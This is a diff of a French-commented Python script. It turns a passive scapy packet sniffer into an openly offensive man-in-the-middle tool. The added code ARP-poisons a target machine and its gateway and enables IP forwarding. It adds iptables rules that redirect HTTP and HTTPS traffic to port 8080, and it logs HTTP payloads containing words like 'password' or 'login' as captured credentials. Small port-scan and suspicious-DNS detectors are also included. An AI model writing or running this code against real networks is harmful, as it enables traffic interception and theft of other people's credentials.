@@ -1,169 +1,202 @@
 #!/usr/bin/env python3
 """
-Caractéristiques principales :
-- Support multi-protocoles (TCP/UDP/ICMP/DNS/HTTP)
-- Statistiques en temps réel
-- Journalisation des événements
-- Filtrage BPF intégré
-- Export PCAP et JSON
-
+Sniffer réseau professionnel avec ARP Spoofing
+Fonctionnalités :
+- Capture de tout le trafic réseau (mode promiscuité)
+- ARP poisoning pour les réseaux commutés
+- Analyse en temps réel (HTTP, DNS, etc.)
+- Gestion des erreurs professionnelle
+- Nettoyage automatique des règles réseau
 """
 
+import os
 import sys
-import logging
-import argparse
-import signal
 import time
-from datetime import datetime
-from collections import defaultdict
-import json
-import socket
-import struct
+import signal
+import logging
+from multiprocessing import Process
 from scapy.all import *
-from scapy.layers import dns, http
+from scapy.layers import http, dns
+
+# Configuration globale
+INTERFACE = "eth0"  # Interface réseau à utiliser
+TARGET_IP = "192.168.1.X"  # IP de la machine cible
+GATEWAY_IP = "192.168.1.254"  # IP de la passerelle (routeur)
+LOG_FILE = "network_monitor.log"  # Fichier de logs
 
 class AdvancedSniffer:
-    def __init__(self, interface=None, filter_exp=None, output_file=None):
-        self.interface = interface or conf.iface
-        self.filter_exp = filter_exp
-        self.output_file = output_file
-        self.packet_count = 0
-        self.protocol_stats = defaultdict(int)
-        self.start_time = time.time()
-        self.logger = self.setup_logger()
+    def __init__(self):
         self.running = True
-
+        self.arp_process = None
+        self.syn_count = 0  # Initialisation du compteur SYN
+        self.last_syn = time.time()  # Timestamp du dernier SYN
+        self.setup_logger()
+        self.check_privileges()
+        self.setup_network()
         signal.signal(signal.SIGINT, self.signal_handler)
 
     def setup_logger(self):
-        logger = logging.getLogger('ADV_SNIFFER')
-        logger.setLevel(logging.INFO)
-        handler = logging.FileHandler('sniffer.log')
-        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-        handler.setFormatter(formatter)
-        logger.addHandler(handler)
-        return logger
+        """Configuration de la journalisation professionnelle"""
+        self.logger = logging.getLogger('NETWORK_MONITOR')
+        self.logger.setLevel(logging.INFO)
+        formatter = logging.Formatter('%(asctime)s :: %(levelname)s :: %(message)s')
+        
+        # Handler fichier
+        file_handler = logging.FileHandler(LOG_FILE)
+        file_handler.setFormatter(formatter)
+        
+        # Handler console
+        console_handler = logging.StreamHandler()
+        console_handler.setFormatter(formatter)
 
-    def signal_handler(self, sig, frame):
-        self.running = False
-        print("\nArrêt en cours... Génération du rapport final.")
-        self.generate_report()
+        self.logger.addHandler(file_handler)
+        self.logger.addHandler(console_handler)
 
-    def generate_report(self):
-        duration = time.time() - self.start_time
-        report = {
-            "duration": f"{duration:.2f} secondes",
-            "total_packets": self.packet_count,
-            "protocols": dict(self.protocol_stats),
-            "average_pps": f"{self.packet_count / duration:.2f} p/s"
-        }
-        print("\n=== Rapport d'analyse ===")
-        print(json.dumps(report, indent=4))
-        with open("sniffer_report.json", "w") as f:
-            json.dump(report, f)
+    def check_privileges(self):
+        """Vérification des privilèges root"""
+        if os.geteuid() != 0:
+            self.logger.error("Erreur : L'exécution nécessite les privilèges root!")
+            sys.exit(1)
 
-    def packet_handler(self, packet):
+    def setup_network(self):
+        """Configuration réseau avancée"""
         try:
-            self.packet_count += 1
-            self.process_packet(packet)
+            # Activation du forwarding IP
+            os.system("sysctl -w net.ipv4.ip_forward=1")
             
-            if self.output_file:
-                wrpcap(self.output_file, packet, append=True)
+            # Configuration iptables pour MITM
+            for port in [80, 443]:  # HTTP et HTTPS
+                os.system(f"iptables -t nat -A PREROUTING -i {INTERFACE} -p tcp --dport {port} -j REDIRECT --to-port 8080")
+            
+            self.logger.info("Configuration réseau terminée")
+        except Exception as e:
+            self.logger.error(f"Erreur de configuration réseau: {str(e)}")
+            self.cleanup()
+            sys.exit(1)
 
-            if self.packet_count % 50 == 0:
-                self.display_stats()
+    def get_mac(self, ip):
+        """Résolution MAC fiable avec timeout"""
+        for _ in range(3):  # 3 tentatives
+            mac = getmacbyip(ip)
+            if mac:
+                return mac
+            time.sleep(1)
+        raise ValueError(f"Impossible de trouver MAC pour {ip}")
+
+    def arp_spoof(self):
+        """ARP poisoning amélioré"""
+        try:
+            target_mac = self.get_mac(TARGET_IP)
+            gateway_mac = self.get_mac(GATEWAY_IP)
+        except ValueError as e:
+            self.logger.error(str(e))
+            return
+
+        arp_target = ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=target_mac)
+        arp_gateway = ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=gateway_mac)
+
+        self.logger.info(f"ARP poisoning démarré entre {TARGET_IP} et {GATEWAY_IP}")
+
+        while self.running:
+            try:
+                send(arp_target, verbose=0, iface=INTERFACE)
+                send(arp_gateway, verbose=0, iface=INTERFACE)
+                time.sleep(2)
+            except Exception as e:
+                self.logger.error(f"Erreur ARP: {str(e)}")
+                break
+
+    def packet_analysis(self, packet):
+        """Analyse approfondie des paquets"""
+        try:
+            # Analyse HTTP
+            if packet.haslayer(http.HTTPRequest):
+                self.analyze_http(packet)
+            
+            # Analyse DNS
+            elif packet.haslayer(dns.DNS):
+                self.analyze_dns(packet)
+            
+            # Détection de scan de ports
+            if TCP in packet and packet[TCP].flags == 'S':
+                self.detect_port_scan(packet)
 
         except Exception as e:
-            self.logger.error(f"Erreur de traitement: {str(e)}")
+            self.logger.warning(f"Erreur d'analyse: {str(e)}")
 
-    def process_packet(self, packet):
-        if packet.haslayer(IP):
-            self.protocol_stats["IP"] +=1
-            ip = packet[IP]
+    def analyze_http(self, packet):
+        """Extraction des informations HTTP sensibles"""
+        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
+        self.logger.info(f"HTTP Request to: {url}")
+        
+        if packet.haslayer(Raw):
+            payload = packet[Raw].load.decode(errors='ignore')
+            keywords = ["password", "user", "login", "session"]
+            for keyword in keywords:
+                if keyword in payload.lower():
+                    self.logger.warning(f"Credentials potentiels trouvés dans HTTP: {payload[:200]}")
+
+    def analyze_dns(self, packet):
+        """Analyse des requêtes DNS"""
+        if packet[dns.DNSQR].qname:
+            domain = packet[dns.DNSQR].qname.decode()
+            self.logger.info(f"DNS Query: {domain}")
             
-            if packet.haslayer(TCP):
-                self.process_tcp(packet, ip)
-            elif packet.haslayer(UDP):
-                self.process_udp(packet, ip)
-            elif packet.haslayer(ICMP):
-                self.process_icmp(packet, ip)
-                
-            if packet.haslayer(http.HTTPRequest):
-                self.process_http(packet)
-            elif packet.haslayer(dns.DNS):
-                self.process_dns(packet)
+            # Détection de domaines suspects
+            suspicious_domains = [".onion", "tor2web", "i2p"]
+            if any(sd in domain for sd in suspicious_domains):
+                self.logger.critical(f"Requête DNS suspecte détectée: {domain}")
 
-    def process_tcp(self, packet, ip):
-        self.protocol_stats["TCP"] +=1
-        tcp = packet[TCP]
-        payload = bytes(tcp.payload)
-        self.logger.info(f"TCP {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} | Taille: {len(payload)} octets")
+    def detect_port_scan(self, packet):
+        """Détection de scan de ports TCP SYN"""
+        self.syn_count += 1
+        if time.time() - self.last_syn > 1:
+            self.syn_count = 0
+            self.last_syn = time.time()
+        else:
+            if self.syn_count > 50:
+                self.logger.critical(f"Port scanning détecté depuis {packet[IP].src}!")
 
-    def process_udp(self, packet, ip):
-        self.protocol_stats["UDP"] +=1
-        udp = packet[UDP]
-        payload = bytes(udp.payload)
-        self.logger.info(f"UDP {ip.src}:{udp.sport} -> {ip.dst}:{udp.dport} | Taille: {len(payload)} octets")
+    def start_sniffing(self):
+        """Démarrage de la capture réseau"""
+        self.logger.info("Démarrage de la surveillance réseau...")
+        sniff_filter = f"host {TARGET_IP} or arp or udp port 53"
+        
+        try:
+            sniff(
+                iface=INTERFACE,
+                filter=sniff_filter,
+                prn=self.packet_analysis,
+                store=False,
+                promisc=True
+            )
+        except Exception as e:
+            self.logger.error(f"Erreur de sniffing: {str(e)}")
+            self.cleanup()
 
-    def process_icmp(self, packet, ip):
-        self.protocol_stats["ICMP"] +=1
-        icmp = packet[ICMP]
-        self.logger.info(f"ICMP {ip.src} -> {ip.dst} | Type: {icmp.type}")
+    def signal_handler(self, sig, frame):
+        """Gestion propre de l'arrêt"""
+        self.logger.info("Arrêt en cours...")
+        self.running = False
+        self.cleanup()
+        sys.exit(0)
 
-    def process_http(self, packet):  # je dois refaire cette partie !!!!!
-        self.protocol_stats["HTTP"] +=1
-        req = packet[http.HTTPRequest]
-        info = {
-            "method": req.Method.decode(),
-            "host": req.Host.decode(),
-            "path": req.Path.decode()
-        }
-        self.logger.info(f"HTTP Request: {info}")
-
-    def process_dns(self, packet):
-        self.protocol_stats["DNS"] +=1
-        dns_layer = packet[dns.DNS]
-        if dns_layer.qr == 0:
-            query = dns_layer.qd.qname.decode()
-            self.logger.info(f"DNS Query: {query}")
-
-    def display_stats(self):
-        sys.stdout.write("\r" + " " * 50 + "\r")
-        sys.stdout.write(f"[Stats] Paquets: {self.packet_count} | Protocoles: {dict(self.protocol_stats)}")
-        sys.stdout.flush()
-
-    def start(self):
-        print(f"Démarrage du sniffer sur {self.interface} | Filtre: {self.filter_exp or 'Aucun'}")
-        self.logger.info(f"Session démarrée - Interface: {self.interface} - Filtre: {self.filter_exp}")
-        sniff(iface=self.interface,
-              filter=self.filter_exp,
-              prn=self.packet_handler,
-              store=False,
-              stop_filter=lambda x: not self.running)
-
-def main():
-    parser = argparse.ArgumentParser(
-        description="Sniffer réseau ",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-    
-    parser.add_argument("-i", "--interface", help="Interface réseau")
-    parser.add_argument("-f", "--filter", help="Filtre BPF")
-    parser.add_argument("-o", "--output", help="Fichier de sortie PCAP")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Mode verbeux")
-    
-    args = parser.parse_args()
-    
-    if os.geteuid() != 0:
-        print("Erreur : L'exécution nécessite les privilèges root. (sudo)")
-        sys.exit(1)
-
-    sniffer = AdvancedSniffer(
-        interface=args.interface,
-        filter_exp=args.filter,
-        output_file=args.output
-    )
-    
-    sniffer.start()
+    def cleanup(self):
+        """Nettoyage sécurisé des règles réseau"""
+        self.logger.info("Nettoyage des règles réseau...")
+        os.system("sysctl -w net.ipv4.ip_forward=0")
+        
+        # Suppression conditionnelle des règles iptables
+        for port in [80, 443]:
+            cmd = f"iptables -t nat -D PREROUTING -i {INTERFACE} -p tcp --dport {port} -j REDIRECT --to-port 8080"
+            os.system(cmd + " 2>/dev/null")
 
 if __name__ == "__main__":
-    main()
+    sniffer = AdvancedSniffer()
+    
+    # Démarrage de l'ARP spoofing dans un processus séparé
+    sniffer.arp_process = Process(target=sniffer.arp_spoof)
+    sniffer.arp_process.start()
+    
+    # Démarrage du sniffing
+    sniffer.start_sniffing()
